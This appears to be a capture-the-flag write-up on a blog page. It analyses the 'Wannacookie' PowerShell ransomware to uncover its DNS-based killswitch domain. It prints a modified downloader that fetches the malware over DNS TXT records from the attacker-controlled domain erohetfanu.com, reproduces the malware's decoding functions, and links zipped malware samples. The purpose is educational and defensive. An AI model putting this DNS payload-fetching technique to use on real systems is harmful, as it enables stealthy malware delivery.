@@ -1,0 +1,274 @@
+<!DOCTYPE html><head><link rel="stylesheet" href="style.css" type="text/css" media="all"/><style type="text/css">.code-black-background{color:#e0e0e0;background-color:#1f1f1f;}</style></head><body><div class="entry-title entry-title-no-feat-img">
+<h1>Objective 9.3: Stop the Malware</h1>
+</div><div class="entry-content">
+<figure class="wp-block-image">
+  <img src="objective9-3.gif" alt="" class="wp-image-902">
+</figure>
+<p>Difficulty: 3/5
+  <br>
+  <br>Alabaster Snowball is in dire need of your help. Santa&apos;s file server
+  has been hit with malware. Help Alabaster Snowball deal with the malware
+  on Santa&apos;s server by completing several tasks.
+  <br>For hints on achieving this objective, please visit Shinny Upatree and
+  help him with the&#xA0;Sleigh Bell Lottery&#xA0;Cranberry Pi terminal challenge.
+  <br>
+  <br>Objective 9.2:
+  <br><strong>Identify a way to stop the malware in its tracks!</strong>
+</p>
+<p>Note: Shinny Upatree can be found on Floor 1, on the South Eastern side
+  of the lobby area
+  <br>
+  <br>Hints given:
+  <br>Shinny Upatree:
+  <br>&quot;<em>Have you heard that Kringle Castle was hit by a new ransomware called Wannacookie? Several elves reported receiving a cookie recipe Word doc. When opened, a PowerShell screen flashed by and their files were encrypted. Many elves were affected, so Alabaster went to go see if he could help out. I hope Alabaster watched the PowerShell Malware talk at KringleCon before he tried analyzing Wannacookie on his computer. An elf I follow online said he analyzed Wannacookie and that it communicates over DNS. He also said that Wannacookie transfers files over DNS and that it looks like it grabs a public key this way. Another recent ransomware made it possible to retrieve crypto keys from memory. Hopefully the same is true for Wannacookie! Of course, this all depends how the key was encrypted and managed in memory. Proper public key encryption requires a private key to decrypt. Perhaps there is a flaw in the wannacookie author&apos;s DNS server that we can manipulate to retrieve what we need. If so, we can retrieve our keys from memory, decrypt the key, and then decrypt our ransomed files.</em>&quot;
+  <br>
+  <br>Alabaster Snowball:
+  <br>&quot;<em>Whoa, Chris Davis&apos; talk on PowerShell malware is crazy pants! You should check it out!</em>&quot;<em> (https://www.youtube.com/watch?v=wd12XRq2DNk)</em>
+  <br>
+  <br>&quot;<em>Erohetfanu.com, I wonder what that means? Unfortunately, Snort alerts show multiple domains, so blocking that one won&apos;t be effective. I remember another ransomware in recent history had a killswitch domain that, when registered, would prevent any further infections. Perhaps there is a mechanism like that in this ransomware? Do some more analysis and see if you can find a fatal flaw and activate it! &quot;<br></em>
+  <br><em>&quot;wannacookie.min.ps1? I wonder if there is a non-minified version? If so, it may be easier to read and give us more information and maybe source comments? &quot;<br></em>
+  <br><em>&quot;I think I remember reading an article recently about&#xA0;</em>
+  <a
+  href="https://www.wired.com/2017/05/accidental-kill-switch-slowed-fridays-massive-ransomware-attack/"><em>Ransomware Kill Switchs</em>
+    </a><em>. Wouldn&apos;t it be nice if our ransomware had one!&quot;<br></em>
+    <br>The source malware script can be downloaded using the PowerShell code
+    obtained from the previous Objective 9-2
+    <br>
+    <br>
+</p>
+<hr class="wp-block-separator">
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p>The code from Objective 9-2 below downloads data over DNS and runs the
+  data from memory using PowerShell.
+  <br>
+  <br>Note: Because the original script from Objective 9-2 is potentially dangerous,
+  only an image is displayed.</p>
+<figure class="wp-block-image">
+  <img src="downloader.gif" alt="" class="wp-image-893">
+</figure>
+<p>The script above can be neutered by removing &quot;iex&quot;
+  <br>The script can write the downloaded data to file rather than output on
+  the screen by changing &quot;Out-string&quot; to &quot;Out-File downloaded&quot;</p>
+<pre class="wp-block-code code-black-background"><code>function H2A($a) {$o; $a -split &apos;(..)&apos; | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}; return $o}; $f = &quot;77616E6E61636F6F6B69652E6D696E2E707331&quot;; $h = &quot;&quot;; foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name &quot;$f.erohetfanu.com&quot; -Type TXT).strings, 10)-1)) {$h += (Resolve-DnsName -Server erohetfanu.com -Name &quot;$i.$f.erohetfanu.com&quot; -Type TXT).strings}; ($(H2A $h | Out-File downloaded))</code>
+  </pre>
+  <div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+  <p>The script is run on a Windows virtual machine, but it can run on Linux
+    by emulating the &apos;Resolve-DnsName&apos; function - refer to the video
+    to see how to run this script on Linux.</p>
+<pre class="wp-block-code code-black-background"><code>PS C:\Users\test&gt; function H2A($a) {$o; $a -split &apos;(..)&apos; | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | for
+Each {$o = $o + $_}; return $o}; $f = &quot;77616E6E61636F6F6B69652E6D696E2E707331&quot;; $h = &quot;&quot;; foreach ($i in 0..([convert]::T
+oInt32((Resolve-DnsName -Server erohetfanu.com -Name &quot;$f.erohetfanu.com&quot; -Type TXT).strings, 10)-1)) {$h += (Resolve-Dns
+Name -Server erohetfanu.com -Name &quot;$i.$f.erohetfanu.com&quot; -Type TXT).strings}; ($(H2A $h | Out-File downloaded))
+PS C:\Users\test&gt;</code></pre>
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p>The code above downloads what looks like the minified version of a PowerShell
+  script. The HEX numbers &apos;77616E6E61636F6F6B69652E6D696E2E707331&apos;
+  decode to &apos;wannacookie.min.ps1&apos;.
+  <br>
+  <br><em>Note: Because this file is recognized by some anti-virus as a virus, the file is zipped in a password protected file - the password is &apos;infected&apos;</em>
+</p>
+<div class="wp-block-file"><a href="https://www.jollyfrogs.com/wp-content/uploads/2019/01/wannacookie.min_.zip">wannacookie.min.zip</a>
+<a href="https://www.jollyfrogs.com/wp-content/uploads/2019/01/wannacookie.min_.zip" class="wp-block-file__button" download="">Download</a>
+</div>
+<p>The original version of the minified script could be called &apos;wannacookie.ps1&apos;
+  so convert &apos;wannacookie.ps1&apos; to HEX numbers (&apos;77616E6E61636F6F6B69652E707331&apos;)
+  and download the non-minified script.
+</p>
+<pre class="wp-block-code code-black-background"><code>PS C:\Users\test&gt; function H2A($a) {$o; $a -split &apos;(..)&apos; | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | for
+Each {$o = $o + $_}; return $o}; $f = &quot;77616E6E61636F6F6B69652E707331&quot;; $h = &quot;&quot;; foreach ($i in 0..([convert]::ToInt32((
+Resolve-DnsName -Server erohetfanu.com -Name &quot;$f.erohetfanu.com&quot; -Type TXT).strings, 10)-1)) {$h += (Resolve-DnsName -Se
+rver erohetfanu.com -Name &quot;$i.$f.erohetfanu.com&quot; -Type TXT).strings}; ($(H2A $h | Out-File wannacookie.ps1))</code></pre>
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p>The code above downloads the non-minified script &apos;wannacookie.ps1&apos;
+  <br>
+  <br><em>Note: Because this file is recognized by some anti-virus as a virus, the file is zipped in a password protected file - the password is &apos;infected&apos;</em>
+</p>
+<div class="wp-block-file"><a href="https://www.jollyfrogs.com/wp-content/uploads/2019/01/wannacookie.zip">wannacookie.zip</a>
+<a href="https://www.jollyfrogs.com/wp-content/uploads/2019/01/wannacookie.zip" class="wp-block-file__button" download="">Download</a>
+</div>
+<p>The script &apos;wannacookie.ps1&apos; contains a few HEX strings:
+  <br>&apos;6B6579666F72626F746964&apos; = &apos;keyforbotid&apos;
+  <br>&apos;6B696C6C737769746368&apos; = &apos;killswitch&apos;
+  <br>&apos;7365727665722E637274&apos; = &apos;server.crt&apos;
+  <br>&apos;72616e736f6d697370616964&apos; = &apos;ransomispaid&apos;
+  <br>
+  <br>The part of code with &apos;killswitch&apos; is copied below
+  <br>
+</p>
+<pre class="wp-block-code code-black-background"><code>$S1 = &quot;1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000&quot;
+if ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) {return}</code></pre>
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p>To display the killswitch domain, the code can be reduced to the following code</p>
+<pre class="wp-block-code code-black-background"><code>function H2B {
+  param($HX);
+  $HX = $HX -split &apos;(..)&apos; |  ? {
+    $_
+  };
+  ForEach($value in $HX) {
+    [Convert]::ToInt32($value, 16)
+  }
+};
+function A2H() {
+  Param($a);
+  $c = &apos;&apos;;
+  $b = $a.ToCharArray(); ;
+  Foreach($element in $b) {
+    $c = $c + &quot; &quot; + [System.String]::Format(&quot;{0:X}&quot;, [System.Convert]::ToUInt32($element))
+  };
+  return $c -replace &apos; &apos;
+};
+function H2A() {
+  Param($a);
+  $outa;
+  $a -split &apos;(..)&apos; |  ? {$_} | forEach {[char]([convert]::toint16($_, 16))} | forEach {$outa = $outa + $_ };
+  return $outa
+};
+function B2H {
+  param($DEC);
+  $tmp = &apos;&apos;;
+  ForEach($value in $DEC) {
+    $a = &quot;{0:x}&quot; -f[Int] $value;
+    if ($a.length -eq 1) {
+      $tmp += &apos;0&apos; + $a
+    } else {
+      $tmp += $a
+    }
+  };
+  return $tmp
+};
+function ti_rox {
+  param($b1, $b2);
+  $b1 = $(H2B $b1);
+  $b2 = $(H2B $b2);
+  $cont = New-Object Byte[] $b1.count;
+  if ($b1.count -eq $b2.count) {
+    for ($i = 0; $i -lt $b1.count; $i++) {
+      $cont[$i] = $b1[$i] -bxor $b2[$i]
+    }
+  };
+  return $cont
+};
+function B2G {
+  param([byte[]]$Data);
+  Process {
+    $out = [System.IO.MemoryStream]::new();
+    $gStream = New-Object System.IO.Compression.GzipStream $out,
+    ([IO.Compression.CompressionMode]::Compress);
+    $gStream.Write($Data, 0, $Data.Length);
+    $gStream.Close();
+    return $out.ToArray()
+  }
+};
+function G2B {
+  param([byte[]]$Data);
+  Process {
+    $SrcData = New-Object System.IO.MemoryStream(, $Data);
+    $output = New-Object System.IO.MemoryStream;
+    $gStream = New-Object System.IO.Compression.GzipStream $SrcData,
+    ([IO.Compression.CompressionMode]::Decompress);
+    $gStream.CopyTo($output);
+    $gStream.Close();
+    $SrcData.Close();
+    [byte[]]$byteArr = $output.ToArray();
+    return $byteArr
+  }
+};
+
+function wanc {
+  $S1 = &quot;1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000&quot;;
+  Write-Host $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1)))$(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings)))
+};
+wanc;</code></pre>
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p>Running the code above in PowerShell, the killswitch domain is revealed</p>
+<pre class="wp-block-code code-black-background"><code>PS C:\Users\test&gt; function H2B {
+&gt;&gt; param($HX);
+&gt;&gt; $HX = $HX -split &apos;(..)&apos; |  ? {
+&gt;&gt; $_
+&gt;&gt; };
+&gt;&gt; ForEach($value in $HX) {
+&gt;&gt; [Convert]::ToInt32($value, 16)
+&gt;&gt; }
+&gt;&gt; };
+PS C:\Users\test&gt; function A2H() {
+&gt;&gt; Param($a);
+&gt;&gt; $c = &apos;&apos;;
+&gt;&gt; $b = $a.ToCharArray(); ;
+&gt;&gt; Foreach($element in $b) {
+&gt;&gt; $c = $c + &quot; &quot; + [System.String]::Format(&quot;{0:X}&quot;, [System.Convert]::ToUInt32($element))
+&gt;&gt; };
+&gt;&gt; return $c -replace &apos; &apos;
+&gt;&gt; };
+PS C:\Users\test&gt; function H2A() {
+&gt;&gt; Param($a);
+&gt;&gt; $outa;
+&gt;&gt; $a -split &apos;(..)&apos; |  ? {$_} | forEach {[char]([convert]::toint16($_, 16))} | forEach {$outa = $outa + $_};
+&gt;&gt; return $outa
+&gt;&gt; };
+PS C:\Users\test&gt; function B2H {
+&gt;&gt; param($DEC);
+&gt;&gt; $tmp = &apos;&apos;;
+&gt;&gt; ForEach($value in $DEC) {
+&gt;&gt; $a = &quot;{0:x}&quot; -f[Int] $value;
+&gt;&gt; if ($a.length -eq 1) {
+&gt;&gt; $tmp += &apos;0&apos; + $a
+&gt;&gt; } else {
+&gt;&gt; $tmp += $a
+&gt;&gt; }
+&gt;&gt; };
+&gt;&gt; return $tmp
+&gt;&gt; };
+PS C:\Users\test&gt; function ti_rox {
+&gt;&gt; param($b1, $b2);
+&gt;&gt; $b1 = $(H2B $b1);
+&gt;&gt; $b2 = $(H2B $b2);
+&gt;&gt; $cont = New-Object Byte[] $b1.count;
+&gt;&gt; if ($b1.count -eq $b2.count) {
+&gt;&gt; for ($i = 0; $i -lt $b1.count; $i++) {
+&gt;&gt; $cont[$i] = $b1[$i] -bxor $b2[$i]
+&gt;&gt; }
+&gt;&gt; };
+&gt;&gt; return $cont
+&gt;&gt; };
+PS C:\Users\test&gt; function B2G {
+&gt;&gt; param([byte[]]$Data);
+&gt;&gt; Process {
+&gt;&gt; $out = [System.IO.MemoryStream]::new();
+&gt;&gt; $gStream = New-Object System.IO.Compression.GzipStream $out,
+&gt;&gt; ([IO.Compression.CompressionMode]::Compress);
+&gt;&gt; $gStream.Write($Data, 0, $Data.Length);
+&gt;&gt; $gStream.Close();
+&gt;&gt; return $out.ToArray()
+&gt;&gt; }
+&gt;&gt; };
+PS C:\Users\test&gt; function G2B {
+&gt;&gt; param([byte[]]$Data);
+&gt;&gt; Process {
+&gt;&gt; $SrcData = New-Object System.IO.MemoryStream(, $Data);
+&gt;&gt; $output = New-Object System.IO.MemoryStream;
+&gt;&gt; $gStream = New-Object System.IO.Compression.GzipStream $SrcData,
+&gt;&gt; ([IO.Compression.CompressionMode]::Decompress);
+&gt;&gt; $gStream.CopyTo($output);
+&gt;&gt; $gStream.Close();
+&gt;&gt; $SrcData.Close();
+&gt;&gt; [byte[]]$byteArr = $output.ToArray();
+&gt;&gt; return $byteArr
+&gt;&gt; }
+&gt;&gt; };
+PS C:\Users\test&gt;
+PS C:\Users\test&gt; function wanc {
+&gt;&gt;     $S1 = &quot;1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000&quot;;
+&gt;&gt;     Write-Host $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1)))$(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C73
+7769746368.erohetfanu.com -Type TXT).Strings)))
+&gt;&gt; };
+PS C:\Users\test&gt; wanc;
+ yippeekiyaa.aaay
+PS C:\Users\test&gt;</code></pre>
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p>The killswitch domain is:
+  <br>yippeekiyaa.aaay
+  <br>
+  <br>Register the domain using the &apos;Ho Ho Ho Daddy&apos; domain registration
+  terminal in Santa&apos;s secret room to complete the challenge.
+</p>
+</div></body></html>
